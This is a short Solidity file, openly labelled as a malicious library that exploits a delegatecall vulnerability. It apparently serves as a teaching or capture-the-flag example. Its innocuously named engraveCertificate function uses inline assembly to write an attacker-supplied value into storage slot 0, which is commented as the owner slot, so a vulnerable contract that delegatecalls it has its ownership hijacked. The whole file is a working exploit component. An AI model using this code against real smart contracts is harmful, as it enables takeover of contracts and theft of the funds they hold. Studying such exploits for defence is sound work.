// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Malicious contract to exploit the delegatecall vulnerability
contract MaliciousLibrary {
    function engraveCertificate(address, uint256 identifier) public {
        assembly {
            sstore(0, identifier) // Write to storage slot 0 (owner slot)
        }
    }
}
